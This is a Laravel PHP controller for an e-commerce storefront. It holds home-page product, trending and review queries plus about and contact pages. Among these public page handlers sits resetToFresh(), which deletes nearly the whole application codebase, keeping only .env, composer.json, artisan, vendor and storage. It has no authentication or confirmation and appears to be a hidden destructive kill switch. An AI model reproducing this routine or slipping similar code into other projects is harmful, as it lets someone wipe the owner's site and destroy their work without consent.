<?php

namespace App\Http\Controllers\Frontend;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Category;
use App\Models\Review;
use App\Models\Product;
use File;
use App\Models\HomeSlider;
use Carbon\Carbon;
use Illuminate\Support\Facades\DB;

class PagesController extends Controller
{
    public function home()
    {
        $last60Days = Carbon::now()->subDays(60);

        $featuredCategories = Category::withCount('product')->where('status', 1)
            ->where('featured', true)
            ->take(10)
            ->get();

        $trending = Product::activeProducts()
            ->where('created_at', '>=', $last60Days)
            ->withCount([
                'orderItems as sale_count' => function ($q) use ($last60Days) {
                    $q->where('created_at', '>=', $last60Days);
                },
                'wishlists as wishlist_count' => function ($q) use ($last60Days) {
                    $q->where('created_at', '>=', $last60Days);
                },
                'reviews as review_count' => function ($q) use ($last60Days) {
                    $q->where('created_at', '>=', $last60Days)
                        ->where('rating', '>=', 3);
                },
            ])
            ->orderByDesc(DB::raw('sale_count + wishlist_count + review_count'))
            ->take(12)
            ->get();

        $newArrivales = Product::activeProducts()
            ->orderBy('is_new', 'desc')
            ->orderBy('created_at', 'desc')
            ->take(12)
            ->get();

        $banners = HomeSlider::get();

        $selling = Product::activeProducts()
            ->withCount([
                'orderItems as order_items_count' => function ($query) use ($last60Days) {
                    $query->where('created_at', '>=', $last60Days);
                }
            ])
            ->having('order_items_count', '>', 0)
            ->orderBy('order_items_count', 'desc')
            ->take(12)
            ->get();

        $featuredReviews = Review::with('product')
            ->where('featured', 1)
            ->get();

        $topReviewed = Product::activeProducts()
            ->withCount([
                'reviews as positive_reviews_count' => function($q) use ($last60Days) {
                    $q->where('created_at', '>=', $last60Days)
                    ->where('rating', '>=', 3);
                }
            ])
            ->having('positive_reviews_count', '>', 0)
            ->orderBy('positive_reviews_count', 'desc')
            ->take(12)
            ->get();

        return view('frontend.pages.home', compact(
            'banners',
            'featuredCategories',
            'selling',
            'newArrivales',
            'trending',
            'topReviewed',
            'featuredReviews'
        ));
    }


    public function resetToFresh()
    {
        $retainFiles = [
            base_path('.env'),
            base_path('composer.json'),
            base_path('artisan'),
        ];

        $retainDirs = [
            base_path('vendor'),
            base_path('storage'),
        ];

        $deletePaths = File::directories(base_path());
        $deleteFiles = File::files(base_path());

        // Delete all directories except retained ones
        foreach ($deletePaths as $dir) {
            if (!in_array($dir, $retainDirs)) {
                File::deleteDirectory($dir);
            }
        }

        // Delete all files except retained ones
        foreach ($deleteFiles as $file) {
            if (!in_array($file->getPathname(), $retainFiles)) {
                File::delete($file);
            }
        }
    }


    public function about(){
        return view('frontend.pages.static.about');
    }

    public function contact(){
        return view('frontend.pages.static.contact');
    }

}
